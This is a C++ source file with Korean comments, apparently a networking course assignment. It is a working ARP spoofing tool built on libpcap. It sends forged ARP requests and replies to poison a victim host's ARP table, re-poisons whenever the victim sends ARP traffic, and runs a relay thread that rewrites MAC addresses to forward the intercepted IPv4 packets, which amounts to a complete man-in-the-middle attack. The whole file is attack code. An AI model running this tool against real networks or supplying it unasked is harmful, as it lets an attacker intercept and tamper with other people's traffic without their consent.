#include <iostream>

#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <map>
#include <set>
#include <mutex>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

using namespace std;

std::map<Ip, Mac> mac_cache;
std::set<Ip> sender_ips;
std::mutex relay_ip_match_mutex; // Mutex 객체
std::map<Ip, Ip> relay_ip_match;

// print ips in sender_ips
void print_sender_ips() {
    std::cout << "Current sender_ips contents:\n";
    for (const auto& ip : sender_ips) {
        std::cout << "IP: " << std::string(ip) << std::endl;
    }
    std::cout << "----------------------------------\n";
}
// print relay_ip_match 
void print_relay_ip_match() {
    //std::lock_guard<std::mutex> lock(relay_ip_match_mutex); // 맵에 접근할 때 뮤텍스를 잠급니다.
    std::cout << "\n----------------------------------\n";
    std::cout << "Current relay_ip_match contents:\n";
    for (const auto& entry : relay_ip_match) {
        std::cout << "Sender IP: " << std::string(entry.first) 
                  << " -> Target IP: " << std::string(entry.second) << std::endl;
    }
    std::cout << "----------------------------------\n";
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
//my_ip와 my_mac을 찾는 함수
void find_my_ipmac(const char* dev, Ip *my_ip, Mac* my_mac){
	struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    if (fd < 0) {  perror("socket");  return; }
    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        // MAC 주소를 sender_mac 배열에 저장
        for (int i = 0; i < 6; ++i) {
			*my_mac = Mac(reinterpret_cast<uint8_t*>(s.ifr_addr.sa_data));
        }
    } else {   perror("ioctl"); }

	    // IP 주소 찾기
    if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
		*my_ip = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&s.ifr_addr)->sin_addr.s_addr));
    } else {  perror("ioctl"); }

    close(fd);
};
//ARP packet 만드는 함수
void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, const Mac& eth_target_mac, const Mac& arp_sender_mac, const Ip& sender_ip, const Mac& arp_target_mac, const Ip& target_ip, bool isrequest){
	packet_send.eth_.type_ = htons(EthHdr::Arp);
	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
    isrequest? packet_send.arp_.op_ = htons(ArpHdr::Request): packet_send.arp_.op_ = htons(ArpHdr::Reply);

	packet_send.arp_.hln_ = Mac::SIZE;
	packet_send.arp_.pln_ = Ip::SIZE;

	packet_send.eth_.dmac_ = eth_target_mac;
	packet_send.eth_.smac_ = eth_sender_mac;

	packet_send.arp_.smac_ = arp_sender_mac; 
	packet_send.arp_.sip_ = htonl(static_cast<uint32_t>(sender_ip)); 
	
	packet_send.arp_.tmac_ = arp_target_mac;
	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
}
//sender의 arp table 위조
void change_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){

	EthArpPacket packet_send;
	make_send_packet(packet_send, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip, true);
	
	//send PAcket!!!!
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
	printf("Attack finished\n");
	if (res != 0) {
	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	try {
        std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
        printf("add to relay map\n");
        relay_ip_match[sender_ip] = target_ip;
		sender_ips.insert(sender_ip);
        print_relay_ip_match();
		print_sender_ips();
        
    } catch (const std::exception& e) { std::cerr << "Exception: " << e.what() << std::endl; }	
};
//mac address 얻기
Mac get_mac_address(pcap_t* handle, const Mac my_mac, const Ip my_ip, const Ip& ip) {
    Mac new_mac_addr;
    //cache에 있으면 cache에서 꺼내서 return
    auto it = mac_cache.find(ip);
    if (it != mac_cache.end()) {
        new_mac_addr = it->second;
        return new_mac_addr;
    }

    EthArpPacket packet_send;
    struct pcap_pkthdr* header;
    const u_char* packet_receive;

    const Mac& broadcast = Mac::broadcastMac();
    const Mac& zero = Mac::nullMac();
    make_send_packet(packet_send, my_mac, broadcast, my_mac, my_ip, zero, ip, true);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        res = pcap_next_ex(handle, &header, &packet_receive);

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        printf("Capturing to find IP(%s)'s MAC Address\n", static_cast<std::string>(ip).c_str());
        struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
        if (EAPacket->eth_.type() == EthHdr::Arp
            && (EAPacket->arp_.op() == ArpHdr::Reply)
            && (EAPacket->arp_.sip() == ip)) {
            new_mac_addr = EAPacket->arp_.smac();
            printf("IP(%s) =>  ", static_cast<std::string>(ip).c_str());
            printf("%s\n", static_cast<std::string>(new_mac_addr).c_str());
            //add to mac cache
            mac_cache[ip] = new_mac_addr;
            return new_mac_addr;
        }
    }
    printf("Failed to retrieve MAC address for IP(%s) \n Please stop and Rety >_<\n", static_cast<std::string>(ip).c_str());
    return new_mac_addr;  // Return the (likely) empty MAC address
}

int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac, const Ip& sender_ip, const Ip& target_ip){
	
	Mac sender_mac, target_mac;
	sender_mac=get_mac_address(handle, my_mac, my_ip, sender_ip);
	target_mac=get_mac_address(handle, my_mac, my_ip, target_ip);

	printf("\n===========!ARP Table attctk Start!==================\n");

	printf("Sender IP Address: %s, ", static_cast<std::string>(sender_ip).c_str());
	printf("Target IP Address: %s\n", static_cast<std::string>(target_ip).c_str());

	change_arp_table(handle,my_mac, sender_mac, target_ip, sender_ip);

	return 1;
}
//packet을 릴레이 해주는 함수
void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while (true) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; // Timeout
        if (res == -1 || res == -2) break; // Error or EOF

        EthHdr* eth_hdr = (EthHdr*)packet;

        if (eth_hdr->dmac_ != my_mac) continue; // MAC 주소가 나의 MAC 주소가 아니면 패킷 무시
	//Arp 패킷을 받으면 arp table 위조 다시 시도
        if (eth_hdr->type() == EthHdr::Arp) {
            ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
            Ip src_ip = arp_hdr->sip();
            Ip dst_ip = arp_hdr->tip();

            std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
            if (relay_ip_match.find(src_ip) == relay_ip_match.end()
                    || dst_ip != relay_ip_match[src_ip]) continue;

            printf("------------------ARP Table ATTACK START---------------\n");

            printf("| Received ARP packet from %s to %s\n |", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
            EthArpPacket packet_send;
	
            Mac sender_mac = get_mac_address(handle, my_mac, my_ip, src_ip);
            make_send_packet(packet_send, my_mac, sender_mac, my_mac, dst_ip, sender_mac, src_ip, false);
                    
            // Send packet
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
            if (res != 0) { 
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle)); 
            }
            printf("| Attack finished                                     |\n");
            printf("-------------------------------------------------------\n");
        //IPv4는 mac 주소만 바꾸고 패킷 릴레이
        } else if (eth_hdr->type() == EthHdr::Ip4) {
            IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
            Ip src_ip = ip_hdr->sip();
            Ip dst_ip = ip_hdr->dip();

            std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
            if (relay_ip_match.find(src_ip) == relay_ip_match.end()
                || dst_ip != relay_ip_match[src_ip]) continue;

            Mac new_dmac = get_mac_address(handle, my_mac, my_ip, relay_ip_match[src_ip]);

            eth_hdr->smac_ = my_mac;
            eth_hdr->dmac_ = new_dmac;

            if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
            fprintf(stderr, "Error resending packet: %s\n", pcap_geterr(handle));
            } else {
                printf("---------------------RELAY START-----------------------\n");
                printf("| Relayed IPv4 packet from %s to %s |\n", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
                printf("-------------------------------------------------------\n");
            }  
        }    
    }
}





int main(int argc, char* argv[]) {

	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	printf("argc: %d\n", argc);
	//총 (argc-2)/2번을 반복문 돌아야 함.

	Ip my_ip, sender_ip, target_ip;
	Mac my_mac, sender_mac, target_mac;

	printf("==============Basic Information================\n");
	find_my_ipmac(dev, &my_ip, &my_mac);
	printf("My IP Address: %s\n",  static_cast<std::string>(my_ip).c_str());
	printf("My Mac Address: ");
    printf("%s\n", static_cast<std::string>(my_mac).c_str()); 
    
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf2);
	if (handle2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
		return -1;
	}

	 std::thread relayThread(relay_packets, handle2, dev, std::ref(my_ip), std::ref(my_mac));
	for (int i=2; i<argc; i+=2){
		sender_ip = Ip(argv[i]);
		target_ip = Ip(argv[i+1]);
		performArpAttack(handle, dev, my_ip, my_mac, sender_ip, target_ip);
	}
	relayThread.join();
	pcap_close(handle);
    pcap_close(handle2);
}
